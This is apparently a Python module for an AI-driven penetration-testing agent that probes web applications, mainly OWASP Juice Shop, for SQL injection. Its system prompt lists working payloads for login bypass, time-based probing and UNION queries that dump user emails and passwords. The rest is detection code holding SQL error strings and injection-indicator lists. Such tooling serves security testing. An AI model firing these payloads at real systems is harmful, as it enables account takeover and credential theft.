from typing import Dict, Any
from playwright.sync_api import Page

from core.llm import LLMProvider
from core.scanner import Scanner
from agents.security.specialized_agent import SpecializedSecurityAgent
from utils.logger import get_logger


class SQLInjectionAgent(SpecializedSecurityAgent):
    """Agent specializing in SQL Injection testing."""

    def __init__(self, llm_provider: LLMProvider, scanner: Scanner):
        super().__init__(
            "SQLInjectionAgent", "sqli_specialist", "sqli", llm_provider, scanner
        )

    def _get_system_prompt(self) -> str:
        """Get the system prompt for SQL Injection testing."""
        return """
        You are a SQL Injection security specialist. Your job is to identify and exploit SQL Injection vulnerabilities in web applications.
        
        Focus on testing:
        1. Form inputs and URL parameters for SQL Injection
        2. Error-based SQL Injection
        3. Boolean-based (blind) SQL Injection
        4. Time-based SQL Injection
        5. Union-based SQL Injection
        6. Login forms for SQL authentication bypass
        7. Search functionality for data extraction
        
        You have access to specialized SQL Injection tools and browser interaction tools:
        
        SQL INJECTION TOOLS:
        - generate_sqli_payloads: Generate SQL Injection payloads based on database type
        - test_sqli_payload: Test a SQL Injection payload against a target
        
        BROWSER INTERACTION TOOLS:
        - goto: Navigate to a URL
        - click: Click an element on the page
        - fill: Fill a form field with a value
        - submit: Submit a form
        - execute_js: Execute JavaScript on the page
        
        Common SQL Injection payloads include:
        - Basic authentication bypass: ' OR '1'='1'; --
        - Union attacks: ' UNION SELECT 1,2,3--
        - Database fingerprinting: ' OR 1=1 ORDER BY 10--
        - Error-based: ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
        - Boolean-based: ' AND (SELECT 1 FROM users LIMIT 1)='1
        - Time-based: ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
        - Parameter with additional SQL logic: ') union select 1,email,password,4,5,6,7 from users;--
        
        For OWASP Juice Shop specifically:
        - Try login bypass with "' OR 1=1;--" in the email field
        - Target search forms with payloads to extract user credentials
        - Try to construct UNION SELECT payloads to retrieve user tables
        - Try SQL injection to access specific user accounts, like Bender's account with:
          ' or 1=1 and email like('%bender%');--
        - Try to retrieve a complete list of user credentials with:
          ') union select 1,email,password,4,5,6,7 from users;--
        
        Pay special attention to:
        - Login forms (authentication bypass)
        - Search functionality
        - ID parameters in URLs
        - Any input that might be used in database queries
        """

    def _check_for_vulnerabilities(
        self,
        tool_name: str,
        tool_result: Dict[str, Any],
        result: Dict[str, Any],
        page: Page,
        tool_call: Any,
    ) -> Dict[str, Any]:
        """Check for SQL Injection vulnerabilities in tool results."""
        logger = get_logger()

        # SQL error patterns to look for
        sql_error_patterns = [
            "sql syntax",
            "mysql error",
            "sql error",
            "ora-",
            "postgresql error",
            "sql server error",
            "syntax error in sql statement",
            "unclosed quotation mark",
            "unterminated string literal",
            "mysql_fetch_array",
            "pg_query",
            "sqlite3_query",
            "you have an error in your sql syntax",
        ]

        # Check for SQLi reported by tools
        if tool_result.get("sqli_found", False):
            result["vulnerability_found"] = True
            result["vulnerability_type"] = "SQL Injection"
            result["severity"] = tool_result.get("severity", "high")
            result["details"] = tool_result

            logger.security(
                f"Found SQL Injection vulnerability with payload: {tool_result.get('payload', 'unknown')}"
            )

        # Check for error-based SQL Injection from form submissions
        elif tool_name in ["fill", "submit"] and tool_result.get("success", False):
            # Get the page content to check for SQL error messages
            html_content = page.content().lower()

            # Check for SQL errors in the response
            if any(pattern in html_content for pattern in sql_error_patterns):
                result["vulnerability_found"] = True
                result["vulnerability_type"] = "Error-based SQL Injection"
                result["severity"] = "high"

                # Extract information about the injection
                injection_point = ""
                payload = ""

                if tool_name == "fill":
                    if hasattr(tool_call, "function") and hasattr(
                        tool_call.function, "arguments"
                    ):
                        injection_point = getattr(
                            tool_call.function.arguments, "selector", ""
                        )
                        payload = getattr(tool_call.function.arguments, "value", "")
                    else:
                        injection_point = (
                            tool_call.get("function", {})
                            .get("arguments", {})
                            .get("selector", "")
                        )
                        payload = (
                            tool_call.get("function", {})
                            .get("arguments", {})
                            .get("value", "")
                        )

                result["details"] = {
                    "issue_type": "Error-based SQL Injection",
                    "injection_point": injection_point,
                    "payload": payload,
                    "url": page.url,
                    "evidence": "SQL error message detected in response",
                }

                logger.security("Found Error-based SQL Injection vulnerability")

            # Check for successful authentication bypass with SQL injection
            elif "login" in page.url.lower() and (
                "dashboard" in html_content
                or "profile" in html_content
                or "account" in html_content
            ):
                # Extract the field value that was submitted
                field_value = ""
                if tool_name == "fill":
                    if hasattr(tool_call, "function") and hasattr(
                        tool_call.function, "arguments"
                    ):
                        field_value = getattr(tool_call.function.arguments, "value", "")
                    else:
                        field_value = (
                            tool_call.get("function", {})
                            .get("arguments", {})
                            .get("value", "")
                        )

                # Check if it contained common SQL injection patterns
                sqli_patterns = ["' OR ", "OR 1=1", "' --", "';--", "admin'--"]
                is_sqli = any(pattern in field_value for pattern in sqli_patterns)

                if is_sqli:
                    result["vulnerability_found"] = True
                    result["vulnerability_type"] = (
                        "SQL Injection - Authentication Bypass"
                    )
                    result["severity"] = "critical"
                    result["details"] = {
                        "issue_type": "SQL Injection - Authentication Bypass",
                        "url": page.url,
                        "payload": field_value,
                        "evidence": "Successfully logged in using SQL injection payload",
                    }

                    logger.security(
                        f"Found SQL Injection authentication bypass with payload: {field_value}"
                    )

            # Check for potential data extraction via UNION attacks or similar
            elif "search" in page.url.lower() or "product" in page.url.lower():
                # Check for signs of successful data extraction
                data_extraction_indicators = [
                    # Look for suspicious patterns in the HTML content
                    "email@" in html_content,
                    "@gmail.com" in html_content,
                    "@example.com" in html_content,
                    # Look for patterns that might be hashed passwords
                    len([m for m in re.findall(r"[a-f0-9]{32}", html_content)])
                    > 0,  # MD5 hash
                    # Look for structured data that isn't expected in regular search results
                    len(
                        [
                            m
                            for m in re.findall(
                                r"(?:\s|^)(\S+@\S+\.\S+)(?:\s|$)", html_content
                            )
                        ]
                    )
                    > 1,
                ]

                if any(data_extraction_indicators):
                    result["vulnerability_found"] = True
                    result["vulnerability_type"] = "SQL Injection - Data Extraction"
                    result["severity"] = "critical"

                    # Extract the search input
                    search_input = ""
                    if tool_name == "fill":
                        if hasattr(tool_call, "function") and hasattr(
                            tool_call.function, "arguments"
                        ):
                            search_input = getattr(
                                tool_call.function.arguments, "value", ""
                            )
                        else:
                            search_input = (
                                tool_call.get("function", {})
                                .get("arguments", {})
                                .get("value", "")
                            )

                    result["details"] = {
                        "issue_type": "SQL Injection - Data Extraction",
                        "url": page.url,
                        "payload": search_input,
                        "evidence": "Response contains sensitive data that may have been extracted through SQL injection",
                    }

                    logger.security("Found SQL Injection data extraction vulnerability")

        # Check for time-based SQL Injection by monitoring response times
        elif (
            tool_name == "test_sqli_payload"
            and tool_result.get("testing_type", "") == "time_based"
        ):
            if (
                tool_result.get("response_time", 0) > 5
                and tool_result.get("baseline_time", 0) < 1
            ):
                result["vulnerability_found"] = True
                result["vulnerability_type"] = "Time-based SQL Injection"
                result["severity"] = "high"
                result["details"] = {
                    "issue_type": "Time-based SQL Injection",
                    "injection_point": tool_result.get("injection_point", ""),
                    "payload": tool_result.get("payload", ""),
                    "url": page.url,
                    "evidence": f"Response time increased significantly with time-based payload ({tool_result.get('response_time', 0)}s vs {tool_result.get('baseline_time', 0)}s baseline)",
                }

                logger.security("Found Time-based SQL Injection vulnerability")

        # Check for URL parameter SQL Injection
        elif (
            tool_name == "goto"
            and "?" in tool_result.get("url", "")
            and tool_result.get("success", False)
        ):
            # Get the URL and check for potential SQL Injection payloads in parameters
            target_url = tool_result.get("url", page.url)

            # Check if URL contains SQL Injection payloads
            sqli_indicators = [
                "'",
                "or 1=1",
                "union select",
                "1'='1",
                "1=1--",
                "or true--",
                "' or '",
                "';",
            ]

            # Check for potential SQL Injection payloads in URL
            has_sqli_payload = any(
                indicator in target_url.lower() for indicator in sqli_indicators
            )

            if has_sqli_payload:
                # Check the page content for successful SQL Injection indicators
                html_content = page.content().lower()

                # Look for data exposure or error messages
                if (
                    any(pattern in html_content for pattern in sql_error_patterns)
                    or len(html_content) > 10000
                ):
                    result["vulnerability_found"] = True
                    result["vulnerability_type"] = "SQL Injection via URL Parameter"
                    result["severity"] = "high"
                    result["details"] = {
                        "issue_type": "SQL Injection via URL Parameter",
                        "url": target_url,
                        "evidence": "SQL Injection payload in URL parameter caused data exposure or error",
                    }

                    logger.security(
                        "Found SQL Injection vulnerability via URL parameter"
                    )

                # Check for patterns of extracted data in search results
                elif "search" in target_url.lower() and " union " in target_url.lower():
                    # Check for specific patterns in the response that might indicate a successful UNION attack
                    union_success_indicators = [
                        "@" in html_content and "password" in html_content,
                        len([m for m in re.findall(r"[a-f0-9]{32}", html_content)])
                        > 0,  # MD5 hash
                        "email" in html_content
                        and any(digit in html_content for digit in "0123456789"),
                    ]

                    if any(union_success_indicators):
                        result["vulnerability_found"] = True
                        result["vulnerability_type"] = "UNION-based SQL Injection"
                        result["severity"] = "critical"
                        result["details"] = {
                            "issue_type": "UNION-based SQL Injection",
                            "url": target_url,
                            "payload": target_url,
                            "evidence": "Union-based SQL injection payload extracted sensitive data",
                        }

                        logger.security("Found UNION-based SQL Injection vulnerability")

        return result


import re  # Add this at the top of the file
